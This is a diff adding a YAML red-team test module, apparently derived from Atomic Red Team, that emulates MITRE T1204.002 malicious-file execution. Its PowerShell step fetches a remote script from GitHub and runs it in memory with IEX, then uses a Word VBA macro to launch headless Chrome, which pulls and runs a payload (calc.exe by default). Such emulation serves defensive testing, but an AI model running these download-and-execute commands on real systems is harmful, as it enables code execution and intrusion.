@@ -1,0 +1,28 @@
+api_version: "2.0"
+name: Headless Chrome code execution via VBA
+description: |
+    This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local
+    webserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver
+    and pull down the script and execute it. By default the payload will execute calc.exe on the system.
+uuid: a19ee671-ed98-4e9d-b19c-d1954a51585a
+mitre:
+    tactics:
+        - 'TA0002: Execution'
+    techniques:
+        - 'T1204: User Execution'
+    subtechniques:
+        - 'T1204.002: Malicious File'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: headless-chrome-code-execution-via-vba
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt" -officeProduct "Word" -sub "ExecChrome"
+      executor: powershell
+      cleanup:
+        inline: |
+            Stop-Process -name mshta
+        executor: powershell
